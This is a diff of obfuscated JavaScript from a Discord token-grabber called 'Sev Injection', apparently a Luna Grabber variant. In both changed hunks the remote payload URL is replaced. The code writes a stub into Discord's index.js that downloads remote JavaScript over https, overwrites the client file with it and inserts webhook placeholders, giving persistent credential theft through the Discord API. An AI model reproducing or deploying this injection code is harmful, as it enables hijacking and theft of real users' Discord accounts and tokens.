@@ -16,7 +16,7 @@ const config = {
   'embed_name': "Sev Injection",
   'embed_icon': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=",
   'embed_color': 0x560ddc,
-  'injection_url': "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js",
+  'injection_url': "https://raw.githubusercontent.com/pentacute1/test/main/test.js",
   'api': "https://discord.com/api/v9/users/@me",
   'nitro': {
     'boost': {
@@ -361,7 +361,7 @@ function updateCheck() {
       'name': "discord",
       'main': "index.js"
     }, null, 4));
-    const _0xf7e943 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x5004bd + "';\nconst bdPath = '" + _0x3cdde7 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x429301, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
+    const _0xf7e943 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x5004bd + "';\nconst bdPath = '" + _0x3cdde7 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/pentacute1/test/main/test.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x429301, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
     fs.writeFileSync(_0x24ac72, _0xf7e943.replace(/\\/g, "\\\\"));
   }
   if (!fs.existsSync(path.join(__dirname, "initiation"))) {
